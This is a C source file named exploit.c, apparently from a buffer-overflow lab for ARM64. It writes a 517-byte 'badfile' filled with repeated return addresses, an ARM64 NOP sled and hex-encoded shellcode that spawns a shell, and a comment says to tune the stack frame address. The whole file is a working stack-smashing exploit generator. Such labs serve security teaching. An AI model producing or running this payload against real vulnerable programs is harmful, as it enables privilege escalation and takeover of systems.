/* exploit.c  */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";


void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    unsigned long fr = 0xfffffffff320 , offset =192, addr;
    //change the stack frame value according to what you get.

    char *ptr;
    unsigned long *addr_ptr;
    unsigned int *addrP , nop = 0x1F2003D5 ;
    int  bsize = 517;
    int i,o;
    
     // where buffer starts
    addr = fr + offset;

    ptr = buffer;
    addr_ptr = (unsigned long*)(ptr);


    for (i = 0; i < 10; i++) // filling the address
      *(addr_ptr++) = addr;
    
    addrP = (unsigned int*)(addr_ptr);
    for (i=0; i<109; i++) // filling with nop values which are 32 bit for arm64
      *(addrP++) = nop;
    
    for (i=0; i<=15; i++) // aligning it with 16 byte alignment
      if ((bsize - (sizeof(shellcode) + 1) - i)%16==0)
          o=i;
    
    /* We now fill the rest of the buffer with our shellcode
       which was provided above. except for the last bits which will be null */
    for (i = 0; i < strlen(shellcode); i++)
      buffer[bsize - (sizeof(shellcode) + 1+o+16) + i] = shellcode[i];

    /* Finally, we insert a NULL value at the very end of the buffer */
    for (i = 1; i<=13;i++ )
    buffer[bsize - i] = '\0';

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
